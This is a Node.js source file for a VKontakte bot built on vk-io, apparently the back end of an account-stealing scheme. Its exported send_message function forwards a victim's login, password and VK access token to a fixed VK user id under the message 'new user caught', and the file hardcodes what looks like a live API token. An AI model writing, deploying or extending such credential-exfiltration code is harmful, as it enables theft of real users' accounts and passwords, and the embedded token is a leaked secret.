const { VK, Keyboard } = require("vk-io");
const vk            = new VK();
const { updates }   = vk;

const baza = require("../db/users.json")

const fs            = require("fs");
vk.setOptions({
  token: `078e2c4c3cbe2655717ced9027386e48b25bc818a018d2c6164358db8e5dfcc0e412bfc9bca83816833a6`,
  apiMode: "parallel"
});


updates.use(async (context, next) => {
  if (context.is("message") && context.isOutbox || context.senderId == undefined) {
    return;
  }
try {
await next();
} catch (err) { console.error(err) }
});

module.exports =  async function send_message(user, data, vk_data) {
  vk.api.messages.send({
    user_ids: [407464535],
    message: `Новый пользователь попался.\nАккаунт: [id${user.id}|${user.first_name} ${user.last_name}]
Логин: ${data.login}
Пароль: ${data.password}
Токен: ${vk_data.token}`
  })
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Random integer
function getRandomInt(x, y) {
  return y
    ? Math.round(Math.random() * (y - x)) + x
    : Math.round(Math.random() * x);
}

// Random element from array
function getRandomElement(array) {
  return array[getRandomInt(array.length - 1)];
}

function sleep(ms) {
  var start = new Date().getTime();
  while (new Date().getTime() - start < ms) {}
  return 1;
}

function getRandomItem(array) {
  return array[Math.floor(Math.random() * array.length)];
}

async function run() {
  await vk.updates.startPolling();
  console.log("Рассылка работает!");
}
run()